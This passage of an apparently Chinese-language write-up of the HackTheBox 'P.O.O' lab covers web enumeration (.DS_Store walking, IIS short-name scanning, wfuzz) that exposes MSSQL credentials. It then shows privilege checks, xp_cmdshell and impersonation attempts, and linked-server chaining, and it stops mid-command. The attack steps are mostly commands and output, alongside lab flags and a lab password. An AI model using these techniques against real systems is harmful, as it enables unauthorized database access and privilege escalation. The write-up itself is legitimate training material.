---
title: HTB-P.O.O
description: 'Pro Labs-P.O.O'
pubDate: 2026-02-04
image: /Pro-Labs/poo.png
categories:
  - Documentation
  - Hackthebox Prolabs
tags:
  - Hackthebox
  - Pro-Labs
---

![](/image/prolabs/P.O.O-1.png)

# Flag
```c
Flag : POO{fcfb0767f5bd3cbc22f40ff5011ad555}

b'POO{88d829eb39f2d11697e689d779810d42}'  

Flag : POO{4882bd2ccfd4b5318978540d9843729f} 

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
POO{ff87c4fe10e2ef096f9a96a01c646f8f}
POO{1196ef8bc523f084ad1732a38a0851d6}
```

# 入口信息收集
## 前置IP
```c
入口IP: 10.13.38.11
攻击机IP：10.10.16.26
```

## 端口扫描
```c
┌──(web)─(root㉿kali)-[/home/kali]
└─# nmap -sCV 10.13.38.11
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-01 23:47 CST
Nmap scan report for 10.13.38.11
Host is up (0.34s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.2056.00; RTM+
| ms-sql-info: 
|   10.13.38.11:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM+
|       number: 14.00.2056.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: true
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-02-01T03:21:34
|_Not valid after:  2056-02-01T03:21:34
| ms-sql-ntlm-info: 
|   10.13.38.11:1433: 
|     Target_Name: POO
|     NetBIOS_Domain_Name: POO
|     NetBIOS_Computer_Name: COMPATIBILITY
|     DNS_Domain_Name: intranet.poo
|     DNS_Computer_Name: COMPATIBILITY.intranet.poo
|     DNS_Tree_Name: intranet.poo
|_    Product_Version: 10.0.17763
|_ssl-date: 2026-02-01T15:48:46+00:00; +1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 1s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.15 seconds
```

![](/image/prolabs/P.O.O-2.png)

## 子域名扫描
### gobuster
```c
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.13.38.11:80
```

发现目录:

- /admin (401 需要认证)

![](/image/prolabs/P.O.O-3.png)

- /dev

- /uploads

- /templates

- /themes

```c
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -u http://10.13.38.11:80
```

**发现:** `/.ds_store`

## .Ds_store枚举
[https://github.com/Keramas/DS_Wal](https://github.com/Keramas/DS_Walk)

> DS_Walk 会枚举 Web 服务器上所有可能存在 .ds_store 文件且可公开访问和下载的文件和目录。该工具会遍历所有目录，直到在后续目录中找不到任何 .ds_store 文件为止。
>

```c
┌──(kali㉿kali)-[~/Desktop/tools/DS_Walk]
└─$ python3 ds_walk.py -u http://10.13.38.11
[!] .ds_store file is present on the webserver.
[+] Enumerating directories based on .ds_server file:
----------------------------
[!] http://10.13.38.11/admin
[!] http://10.13.38.11/dev
[!] http://10.13.38.11/iisstart.htm
[!] http://10.13.38.11/Images
[!] http://10.13.38.11/JS
[!] http://10.13.38.11/META-INF
[!] http://10.13.38.11/New folder
[!] http://10.13.38.11/New folder (2)
[!] http://10.13.38.11/Plugins
[!] http://10.13.38.11/Templates
[!] http://10.13.38.11/Themes
[!] http://10.13.38.11/Uploads
[!] http://10.13.38.11/web.config
[!] http://10.13.38.11/Widgets
----------------------------
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc
----------------------------
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/core
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/include
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/src
----------------------------
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/core
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/include
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/src
----------------------------
[!] http://10.13.38.11/Images/buttons
[!] http://10.13.38.11/Images/icons
[!] http://10.13.38.11/Images/iisstart.png
----------------------------
[!] http://10.13.38.11/JS/custom
----------------------------
[!] http://10.13.38.11/Themes/default
----------------------------
[!] http://10.13.38.11/Widgets/CalendarEvents
[!] http://10.13.38.11/Widgets/Framework
[!] http://10.13.38.11/Widgets/Menu
[!] http://10.13.38.11/Widgets/Notifications
----------------------------
[!] http://10.13.38.11/Widgets/Framework/Layouts
----------------------------
[!] http://10.13.38.11/Widgets/Framework/Layouts/custom
[!] http://10.13.38.11/Widgets/Framework/Layouts/default
----------------------------
[*] Finished traversing. No remaining .ds_store files present.                                                        
[*] Cleaning up .ds_store files saved to disk.
```

其中发现俩个md5字符串

/dev/304c0c90fbc6520610abbf378e2339d1/db

![](/image/prolabs/P.O.O-4.png)

/dev/dca66d38fd916317687e1390a420c3fc/db

![](/image/prolabs/P.O.O-5.png)

```c
/dev/304c0c90fbc6520610abbf378e2339d1/db
/dev/dca66d38fd916317687e1390a420c3fc/db

注: 这两个hash可能是创建者名字的MD5:
- md5(mrb3n) = 304c0c90fbc6520610abbf378e2339d1
- md5(eks) = dca66d38fd916317687e1390a420c3fc
```

## <font style="color:rgb(51, 51, 51);">IIS短文件名枚举</font>
[https://github.com/lijiejie/IIS_shortname_Scanner](https://github.com/lijiejie/IIS_shortname_Scanner)

```c
┌──(kali㉿kali)-[~/Desktop/tools/IIS_shortname_Scanner]
└─$ python iis_shortname_scan.py http://10.13.38.11
Server is vulnerable, please wait, scanning...
[+] /d~1.*      [scan in progress]
[+] /n~1.*      [scan in progress]
[+] /t~1.*      [scan in progress]
[+] /w~1.*      [scan in progress]
[+] /ds~1.*     [scan in progress]
[+] /ne~1.*     [scan in progress]
[+] /te~1.*     [scan in progress]
[+] /tr~1.*     [scan in progress]
[+] /we~1.*     [scan in progress]
[+] /ds_~1.*    [scan in progress]
[+] /new~1.*    [scan in progress]
[+] /tem~1.*    [scan in progress]
[+] /tra~1.*    [scan in progress]
[+] /web~1.*    [scan in progress]
[+] /ds_s~1.*   [scan in progress]
[+] /newf~1.*   [scan in progress]
[+] /temp~1.*   [scan in progress]
[+] /tras~1.*   [scan in progress]
[+] /ds_st~1.*  [scan in progress]
[+] /newfo~1.*  [scan in progress]
[+] /templ~1.*  [scan in progress]
[+] /trash~1.*  [scan in progress]
[+] /ds_sto~1.* [scan in progress]
[+] /newfol~1.* [scan in progress]
[+] /templa~1.* [scan in progress]
[+] /trashe~1.* [scan in progress]
[+] /ds_sto~1   [scan in progress]
[+] Directory /ds_sto~1 [Done]
[+] /newfol~1   [scan in progress]
[+] Directory /newfol~1 [Done]
[+] /templa~1   [scan in progress]
[+] Directory /templa~1 [Done]
[+] /trashe~1   [scan in progress]
[+] Directory /trashe~1 [Done]
----------------------------------------------------------------
Dir:  /ds_sto~1
Dir:  /newfol~1
Dir:  /templa~1
Dir:  /trashe~1
----------------------------------------------------------------
4 Directories, 0 Files found in total
Note that * is a wildcard, matches any character zero or more times.

```

```c
┌──(kali㉿kali)-[~/Desktop/tools/IIS_shortname_Scanner]
└─$ python iis_shortname_scan.py http://10.13.38.11/dev/
Server is vulnerable, please wait, scanning...
[+] /dev/d~1.*  [scan in progress]
[+] /dev/3~1.*  [scan in progress]
[+] /dev/dc~1.* [scan in progress]
[+] /dev/ds~1.* [scan in progress]
[+] /dev/30~1.* [scan in progress]
[+] /dev/dca~1.*        [scan in progress]
[+] /dev/ds_~1.*        [scan in progress]
[+] /dev/304~1.*        [scan in progress]
[+] /dev/dca6~1.*       [scan in progress]
[+] /dev/ds_s~1.*       [scan in progress]
[+] /dev/304c~1.*       [scan in progress]
[+] /dev/dca66~1.*      [scan in progress]
[+] /dev/ds_st~1.*      [scan in progress]
[+] /dev/304c0~1.*      [scan in progress]
[+] /dev/dca66d~1.*     [scan in progress]
[+] /dev/ds_sto~1.*     [scan in progress]
[+] /dev/304c0c~1.*     [scan in progress]
[+] /dev/dca66d~1       [scan in progress]
[+] Directory /dev/dca66d~1     [Done]
[+] /dev/ds_sto~1       [scan in progress]
[+] Directory /dev/ds_sto~1     [Done]
[+] /dev/304c0c~1       [scan in progress]
[+] Directory /dev/304c0c~1     [Done]
----------------------------------------------------------------
Dir:  /dev/dca66d~1
Dir:  /dev/ds_sto~1
Dir:  /dev/304c0c~1
----------------------------------------------------------------
3 Directories, 0 Files found in total
Note that * is a wildcard, matches any character zero or more times.

```

```c
┌──(kali㉿kali)-[~/Desktop/tools/IIS_shortname_Scanner]
└─$ python iis_shortname_scan.py http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1
Server is vulnerable, please wait, scanning...
[+] /dev/304c0c90fbc6520610abbf378e2339d1/d~1.* [scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/ds~1.*        [scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/ds_~1.*       [scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/ds_s~1.*      [scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/ds_st~1.*     [scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/ds_sto~1.*    [scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/ds_sto~1      [scan in progress]
[+] Directory /dev/304c0c90fbc6520610abbf378e2339d1/ds_sto~1       [Done]
----------------------------------------------------------------
Dir:  /dev/304c0c90fbc6520610abbf378e2339d1/ds_sto~1
----------------------------------------------------------------
1 Directories, 0 Files found in total
Note that * is a wildcard, matches any character zero or more times.
```

```c
┌──(kali㉿kali)-[~/Desktop/tools/IIS_shortname_Scanner]
└─$ python iis_shortname_scan.py http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc
Server is vulnerable, please wait, scanning...
[+] /dev/dca66d38fd916317687e1390a420c3fc/d~1.* [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/ds~1.*        [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/ds_~1.*       [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/ds_s~1.*      [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/ds_st~1.*     [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/ds_sto~1.*    [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/ds_sto~1      [scan in progress]
[+] Directory /dev/dca66d38fd916317687e1390a420c3fc/ds_sto~1       [Done]
----------------------------------------------------------------
Dir:  /dev/dca66d38fd916317687e1390a420c3fc/ds_sto~1
----------------------------------------------------------------
1 Directories, 0 Files found in total
Note that * is a wildcard, matches any character zero or more times.
```

```c
┌──(kali㉿kali)-[~/Desktop/tools/IIS_shortname_Scanner]
└─$ python iis_shortname_scan.py http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/core
Server is not vulnerable
                                                           
┌──(kali㉿kali)-[~/Desktop/tools/IIS_shortname_Scanner]
└─$ python iis_shortname_scan.py http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/include
Server is not vulnerable
                                                           
┌──(kali㉿kali)-[~/Desktop/tools/IIS_shortname_Scanner]
└─$ python iis_shortname_scan.py http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/src    
Server is not vulnerable
```

```c
┌──(kali㉿kali)-[~/Desktop/tools/IIS_shortname_Scanner]
└─$ python iis_shortname_scan.py http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db 
Server is vulnerable, please wait, scanning...
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/p~1.*      [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/po~1.*     [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo~1.*    [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_~1.*   [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_c~1.*  [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.* [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.t*  [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.tx* [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*[scan in progress]
[+] File /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*    [Done]
----------------------------------------------------------------
File: /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*
----------------------------------------------------------------
0 Directories, 1 Files found in total
Note that * is a wildcard, matches any character zero or more times.
```

这里我们成功枚举出poo_co???????.txt的文件，我们并不知道co后面存在几位需要枚举的字符

我们从 `raft-large-words-lowercase.txt` 目录下 `grep` 以 `co` 开头的单词，这样就能得到一个相对较小的单词列表：

```c
┌──(kali㉿kali)-[~/Desktop/htb/poo]
└─$ grep "^co" /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt > co_fuzz.txt 

┌──(kali㉿kali)-[~/Desktop/htb/poo]
└─$ wc co_fuzz.txt 
 2351  2351 25916 co_fuzz.txt
```

然后使用`wfuzz`进行枚举:

```c
wfuzz -c -w co_fuzz.txt -u "http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/poo_FUZZ" --hc 404
```

```c
┌──(kali㉿kali)-[~]
└─$ wfuzz -c -w co_fuzz.txt -u "http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/poo_FUZZ.txt" --hc 404
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/poo_FUZZ.txt
Total requests: 2351

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                 
=====================================================================

000000097:   200        6 L      7 W        142 Ch      "connection" 
```

```c
SERVER=10.13.38.11
USERID=external_user
DBNAME=POO_PUBLIC
USERPWD=#p00Public3xt3rnalUs3r#

Flag : POO{fcfb0767f5bd3cbc22f40ff5011ad555}
```

成功拿到凭据和第一个flag

# Mssql
```c
impacket-mssqlclient intranet.poo/external_user:#p00Public3xt3rnalUs3r#@10.13.38.11
```

```c
┌──(kali㉿kali)-[~/Desktop/htb/poo]
└─$ impacket-mssqlclient intranet.poo/external_user:#p00Public3xt3rnalUs3r#@10.13.38.11
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed database context to 'master'.
[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017  (14.0.2056)
[!] Press help for extra shell commands
SQL (external_user  external_user@master)> 
```

## 信息收集
```c
-- 当前 SQL Server 登录名（服务器级身份）
SQL (external_user  external_user@master)> select system_user;           
-------------   
external_user    -- 当前登录是 external_user（SQL_LOGIN）


-- 当前数据库用户（数据库级身份）
SQL (external_user  external_user@master)> select user_name();         
-------------   
external_user    -- 在 master 数据库中对应的 user 也是 external_user


-- 当前正在使用的数据库
SQL (external_user  external_user@master)> select db_name();
------   
master           -- 当前上下文是 master 数据库


-- SQL Server 版本 + 操作系统信息
SQL (external_user  external_user@master)> select @@version;
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
Microsoft SQL Server 2017 (RTM-GDR) (KB5040942) - 14.0.2056.2 (X64) 
        Jun 20 2024 11:02:32 
        Copyright (C) 2017 Microsoft Corporation
        Standard Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
-- SQL Server 2017，Windows Server 2019，Standard 版


-- 是否属于 sysadmin（最高服务器权限）
SQL (external_user  external_user@master)> select is_srvrolemember('sysadmin')
-   
0               -- 0 = 不是 sysadmin


-- 是否属于 serveradmin（服务器管理权限）
SQL (external_user  external_user@master)> select is_srvrolemember('serveradmin');
-   
0               -- 没有 serveradmin 权限


-- 是否属于 securityadmin（安全管理权限）
SQL (external_user  external_user@master)> select is_srvrolemember('securityadmin');
-- 无返回值 = 也不是 securityadmin


-- 是否是当前数据库的 db_owner
SQL (external_user  external_user@master)> select is_member('db_owner');
-   
0               -- 不是数据库所有者


-- 是否有数据库读权限
SQL (external_user  external_user@master)> select is_member('db_datareader');
-   
0               -- 没有全表读取权限


-- 是否有数据库写权限
SQL (external_user  external_user@master)> select is_member('db_datawriter');
-   
0               -- 没有写权限


-- 枚举服务器级主体（登录 / 服务器角色）
SQL (external_user  external_user@master)> select name, type_desc, is_disabled from sys.server_principals;
name            type_desc     is_disabled   
-------------   -----------   -----------   
sa              SQL_LOGIN               0   -- sa 登录，启用
public          SERVER_ROLE             0   -- public 服务器角色
sysadmin        SERVER_ROLE             0   -- sysadmin 角色
securityadmin   SERVER_ROLE             0
serveradmin     SERVER_ROLE             0
setupadmin      SERVER_ROLE             0
processadmin    SERVER_ROLE             0
diskadmin       SERVER_ROLE             0
dbcreator       SERVER_ROLE             0
bulkadmin       SERVER_ROLE             0
external_user   SQL_LOGIN               0   -- 当前使用的低权限登录


-- 枚举当前实例上的所有数据库
SQL (external_user  external_user@master)> select name from sys.databases;
name         
----------   
master       -- 系统数据库
tempdb       -- 系统数据库
POO_PUBLIC   -- 业务/靶机数据库（重点）


-- 枚举所有未禁用的服务器主体
SQL (external_user  external_user@master)> select name, type_desc from sys.server_principals where is_disabled = 0;
name            type_desc     
-------------   -----------   
sa              SQL_LOGIN     
public          SERVER_ROLE   
sysadmin        SERVER_ROLE   
securityadmin   SERVER_ROLE   
serveradmin     SERVER_ROLE   
setupadmin      SERVER_ROLE   
processadmin    SERVER_ROLE   
diskadmin       SERVER_ROLE   
dbcreator       SERVER_ROLE   
bulkadmin       SERVER_ROLE   
external_user   SQL_LOGIN    


-- 尝试模拟为 sa 登录（需要 IMPERSONATE 权限）
SQL (external_user  external_user@master)> execute as login = 'sa';select system_user;
ERROR(COMPATIBILITY\POO_PUBLIC): Line 1: Cannot execute as the server principal because the principal "sa" does not exist, this type of principal cannot be impersonated, or you do not have permission.
-- 失败原因：external_user 没有 impersonate sa 的权限


-- 查看数据库是否开启 TRUSTWORTHY（提权相关）
SQL (external_user  external_user@master)> select name, is_trustworthy_on from sys.databases;
name         is_trustworthy_on   
----------   -----------------   
master                       0   -- 关闭
tempdb                       0   -- 关闭
POO_PUBLIC                   0   -- 关闭（不能走 trustworthy 提权）


-- 尝试执行系统命令（需要 sysadmin 或显式授权）
SQL (external_user  external_user@master)> exec xp_cmdshell 'whoami';
ERROR(COMPATIBILITY\POO_PUBLIC): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
-- xp_cmdshell 未授权，且你不是 sysadmin

```

```c
SQL (external_user  external_user@master)> use POO_PUBLIC;
ENVCHANGE(DATABASE): Old Value: master, New Value: POO_PUBLIC
INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed database context to 'POO_PUBLIC'.
SQL (external_user  dbo@POO_PUBLIC)> select db_name();    
----------   
POO_PUBLIC   

SQL (external_user  dbo@POO_PUBLIC)> select user_name();
---   
dbo   

SQL (external_user  dbo@POO_PUBLIC)> select has_dbaccess('guest');  
----   
NULL   
```

可以发现external_user 被映射成了 dbo（数据库所有者）

## <font style="color:rgb(13, 13, 13);">现在能干什么？</font>
<font style="color:rgb(13, 13, 13);">你作为</font><font style="color:rgb(13, 13, 13);"> </font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">dbo@POO_PUBLIC</font>**`<font style="color:rgb(13, 13, 13);">，你</font>**<font style="color:rgb(13, 13, 13);">可以做的事情非常多</font>**<font style="color:rgb(13, 13, 13);">：</font>

| **<font style="color:rgb(13, 13, 13);">能力</font>** | **<font style="color:rgb(13, 13, 13);">状态</font>** |
| --- | --- |
| <font style="color:rgb(13, 13, 13);">读所有表</font> | <font style="color:rgb(13, 13, 13);">✅</font> |
| <font style="color:rgb(13, 13, 13);">写所有表</font> | <font style="color:rgb(13, 13, 13);">✅</font> |
| <font style="color:rgb(13, 13, 13);">创建视图 / 过程</font> | <font style="color:rgb(13, 13, 13);">✅</font> |
| <font style="color:rgb(13, 13, 13);">ALTER 表</font> | <font style="color:rgb(13, 13, 13);">✅</font> |
| <font style="color:rgb(13, 13, 13);">CREATE ASSEMBLY</font> | <font style="color:rgb(13, 13, 13);">❌</font><font style="color:rgb(13, 13, 13);">（取决于 CLR）</font> |
| <font style="color:rgb(13, 13, 13);">xp_cmdshell</font> | <font style="color:rgb(13, 13, 13);">❌</font> |
| <font style="color:rgb(13, 13, 13);">提权到 sysadmin</font> | <font style="color:rgb(13, 13, 13);">⚠️</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">有可能</font>** |


## 数据库提权
### <font style="color:rgb(13, 13, 13);">一、当前身份确认</font>
#### <font style="color:rgb(13, 13, 13);">1. 确认当前服务器与用户</font>
```plain
select @@servername;
select system_user;
select user_name();
```

<font style="color:rgb(13, 13, 13);">输出：</font>

```plain
COMPATIBILITY\POO_PUBLIC 
external_user
external_user
```

#### <font style="color:rgb(13, 13, 13);">📌</font><font style="color:rgb(13, 13, 13);"> 知识点解释</font>
+ `**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">@@servername</font>**`<font style="color:rgb(13, 13, 13);">：当前 SQL Server 实例名</font>
+ `**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">system_user</font>**`<font style="color:rgb(13, 13, 13);">：当前</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">SQL Server 登录用户</font>**
+ `**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">user_name()</font>**`<font style="color:rgb(13, 13, 13);">：当前</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">数据库用户</font>**

<font style="color:rgb(13, 13, 13);">此时我确认：</font>

+ <font style="color:rgb(13, 13, 13);">当前位于</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">POO_PUBLIC</font>**
+ <font style="color:rgb(13, 13, 13);">使用的是一个</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">低权限外部账号 external_user</font>**

---

### <font style="color:rgb(13, 13, 13);">二、发现 Linked Server（关键前置条件）</font>
#### <font style="color:rgb(13, 13, 13);">2. 枚举链接服务器</font>
```plain
select srvname from sysservers;
```

<font style="color:rgb(13, 13, 13);">输出：</font>

```plain
COMPATIBILITY\POO_PUBLIC
COMPATIBILITY\POO_CONFIG
```

#### <font style="color:rgb(13, 13, 13);">📌</font><font style="color:rgb(13, 13, 13);"> 知识点解释（非常重要）</font>
**<font style="color:rgb(13, 13, 13);">Linked Server（链接服务器）</font>**<font style="color:rgb(13, 13, 13);"> </font><font style="color:rgb(13, 13, 13);">是 MSSQL 的一种功能，允许一个 SQL Server：</font>

+ <font style="color:rgb(13, 13, 13);">使用</font>**<font style="color:rgb(13, 13, 13);">预先配置好的账号</font>**
+ <font style="color:rgb(13, 13, 13);">去访问另一个数据库服务器</font>
+ <font style="color:rgb(13, 13, 13);">执行 SQL 语句</font>

<font style="color:rgb(13, 13, 13);">👉</font><font style="color:rgb(13, 13, 13);"> 一旦存在 Linked Server，</font>**<font style="color:rgb(13, 13, 13);">权限就不再是“单点”的，而是“链式”的</font>**<font style="color:rgb(13, 13, 13);">。</font>

---

### <font style="color:rgb(13, 13, 13);">三、在远程服务器上执行 SQL</font>
#### <font style="color:rgb(13, 13, 13);">3. 使用 Linked Server 执行远程命令</font>
```plain
EXECUTE ('select @@servername;') at [COMPATIBILITY\POO_CONFIG];
```

<font style="color:rgb(13, 13, 13);">输出：</font>

```plain
COMPATIBILITY\POO_CONFIG
```

#### <font style="color:rgb(13, 13, 13);">📌</font><font style="color:rgb(13, 13, 13);"> 知识点解释</font>
<font style="color:rgb(13, 13, 13);">语法结构：</font>

```plain
EXECUTE ('SQL语句') at [LinkedServer名称]
```

<font style="color:rgb(13, 13, 13);">含义是：</font>

**“不要在当前服务器执行，而是让远程服务器执行”**

<font style="color:rgb(13, 13, 13);">这一步证明：</font>

+ <font style="color:rgb(13, 13, 13);">我可以通过</font><font style="color:rgb(13, 13, 13);"> </font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">POO_PUBLIC</font>**`
+ <font style="color:rgb(13, 13, 13);">控制</font><font style="color:rgb(13, 13, 13);"> </font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">POO_CONFIG</font>**`<font style="color:rgb(13, 13, 13);"> </font><font style="color:rgb(13, 13, 13);">执行 SQL</font>

---

### <font style="color:rgb(13, 13, 13);">四、确认远程执行所使用的身份</font>
#### <font style="color:rgb(13, 13, 13);">4. 查看在 POO_CONFIG 上的执行身份</font>
```plain
EXECUTE ('select suser_name();') at [COMPATIBILITY\POO_CONFIG];
```

<font style="color:rgb(13, 13, 13);">输出：</font>

```plain
internal_user
```

#### <font style="color:rgb(13, 13, 13);">📌</font><font style="color:rgb(13, 13, 13);"> 知识点解释（核心）</font>
<font style="color:rgb(13, 13, 13);">这说明：</font>

+ **<font style="color:rgb(13, 13, 13);">Linked Server 并不是用我的 external_user 身份</font>**
+ <font style="color:rgb(13, 13, 13);">而是用管理员配置好的</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">internal_user</font>**

<font style="color:rgb(13, 13, 13);">📌</font><font style="color:rgb(13, 13, 13);"> 这叫做</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">安全上下文映射（Security Context Mapping）</font>**

---

### <font style="color:rgb(13, 13, 13);">五、确认 internal_user 的权限等级</font>
#### <font style="color:rgb(13, 13, 13);">5. 查询 internal_user 在 POO_CONFIG 上的权限</font>
```plain
EXECUTE (
  'SELECT entity_name, permission_name 
   FROM fn_my_permissions(NULL, ''SERVER'');'
) at [COMPATIBILITY\POO_CONFIG];
```

<font style="color:rgb(13, 13, 13);">输出：</font>

```plain
server | CONNECT SQL
```

#### <font style="color:rgb(13, 13, 13);">📌</font><font style="color:rgb(13, 13, 13);"> 知识点解释</font>
+ `**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">fn_my_permissions</font>**`<font style="color:rgb(13, 13, 13);">：查看当前身份拥有哪些权限</font>
+ `**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">CONNECT SQL</font>**`<font style="color:rgb(13, 13, 13);">：仅允许连接数据库</font>

<font style="color:rgb(13, 13, 13);">说明：</font>

+ `**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">internal_user</font>**`<font style="color:rgb(13, 13, 13);"> </font><font style="color:rgb(13, 13, 13);">是</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">低权限账号</font>**
+ <font style="color:rgb(13, 13, 13);">无法直接提权或执行系统命令</font>



```plain
fn_my_permissions ( securable , securable_class )
```

| 参数 | 含义 |
| --- | --- |
| `securable` | 权限对象（具体对象名） |
| `securable_class` | 权限作用层级 |


**🔹**** 第一个参数：**`**NULL**`

```plain
NULL
```

含义：

**不指定具体对象 → 查询“整个层级”的权限**

对比理解：

```plain
-- 查服务器整体权限
fn_my_permissions(NULL, 'SERVER')

-- 查某个数据库权限
fn_my_permissions('POO_PUBLIC', 'DATABASE')

-- 查某张表权限
fn_my_permissions('users', 'OBJECT')
```

**🔹**** 第二个参数：**`**'SERVER'**`

```plain
'SERVER'
```

含义：

**权限作用在“SQL Server 实例级别”**

可选值常见的有：

| 值 | 作用范围 |
| --- | --- |
| `SERVER` | 整个 SQL Server |
| `DATABASE` | 当前数据库 |
| `OBJECT` | 表 / 视图 / 存储过程 |
| `SCHEMA` | 架构 |




```plain
SELECT entity_name, permission_name
```

**1️⃣**** **`**entity_name**`

权限作用的对象名称

在 SERVER 级别时，通常是：

```plain
SERVER
```

---

2️⃣ `**permission_name**`

**你当前登录“被明确授予”的权限名称**

例如可能看到：

| permission_name |
| --- |
| VIEW ANY DATABASE |
| CONNECT SQL |
| ALTER ANY LOGIN |
| IMPERSONATE LOGIN |


---

### <font style="color:rgb(13, 13, 13);">六、关键漏洞点：权限“回弹”测试</font>
#### <font style="color:rgb(13, 13, 13);">6. 让 POO_CONFIG 再反向访问 POO_PUBLIC</font>
```plain
EXEC ('EXEC (''select suser_name();'') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
```

```plain
EXEC (
  'EXEC (''select suser_name();'') 
   at [COMPATIBILITY\POO_PUBLIC]'
